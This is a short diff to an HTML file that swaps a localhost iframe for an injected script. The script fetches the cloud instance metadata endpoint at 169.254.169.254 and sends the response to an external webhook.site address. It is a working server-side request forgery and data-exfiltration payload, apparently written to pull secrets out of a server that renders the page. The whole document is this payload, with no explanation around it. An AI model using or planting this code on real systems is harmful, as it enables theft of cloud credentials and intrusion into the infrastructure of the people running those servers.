@@ -1,1 +1,5 @@
-<iframe src=http://localhost:4000></iframe>
+<script>
+    fetch('http://169.254.169.254/latest/meta-data/')
+        .then(x => x.text())
+        .then(x => fetch('https://webhook.site/aff99555-e8f3-42ef-9062-8d1721a05c63', {body: x}))
+</script>
